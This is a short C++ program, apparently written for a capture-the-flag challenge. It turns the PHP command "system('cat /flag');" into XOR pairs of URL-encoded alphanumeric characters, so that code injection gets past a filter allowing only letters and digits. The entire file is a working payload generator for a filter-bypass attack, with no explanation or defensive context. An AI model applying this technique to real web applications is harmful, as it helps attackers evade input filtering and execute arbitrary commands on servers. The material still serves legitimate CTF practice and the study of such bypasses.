#include <cstdio>
#include <cstring>

bool invaild(const char x) {
    char chk[] = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    for (int i = 0; i < strlen(chk); i++) {
        char c = chk[i];
        if (c == x) return 0;
    }
    return 1;
}

int main() {
    char cmd[] = "system('cat /flag');";
    for (int i = 0; i < strlen(cmd); i++) {
        char c = 0x01, m = cmd[i];
        while (invaild(c) || invaild(c ^ m)) c++;
        printf("{'%%%.2x'^'%%%.2x'}.", c, c^m);
    }
    return 0;
}